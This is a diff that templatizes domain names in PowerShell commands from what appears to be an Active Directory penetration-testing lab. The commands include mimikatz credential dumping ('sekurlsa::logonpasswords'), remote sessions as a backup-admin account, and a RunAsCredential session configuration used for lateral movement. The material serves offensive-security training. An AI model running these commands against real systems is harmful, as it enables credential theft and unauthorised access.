@@ -9,7 +9,7 @@
 ## 1. `powershell` _(output omitted)_
 
 ```powershell
-PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
+PS C:\Users\ben.{{DOMAIN_NB}}> Enter-PSSession -ComputerName DEV01 -Credential {{DOMAIN_NB}}\backupadm
 cd 'C:\Users\Public\'
 .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
 ```
@@ -29,7 +29,7 @@ klist
 ## 4. `powershell`
 
 ```powershell
-Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
+Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.{{DOMAIN_UPPER}} -Credential {{DOMAIN_NB}}\backupadm
 ```
 
 ## 5. `powershell` _(output omitted)_
@@ -48,13 +48,13 @@ get-domainuser -spn | select samaccountname
 ## 7. `powershell` _(output omitted)_
 
 ```powershell
-Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
+Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential {{DOMAIN_NB}}\backupadm
 ```
 
 ## 8. `powershell` _(output omitted)_
 
 ```powershell
-Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
+Enter-PSSession -ComputerName DEV01 -Credential {{DOMAIN_NB}}\backupadm -ConfigurationName  backupadmsess
 klist
 ```
 
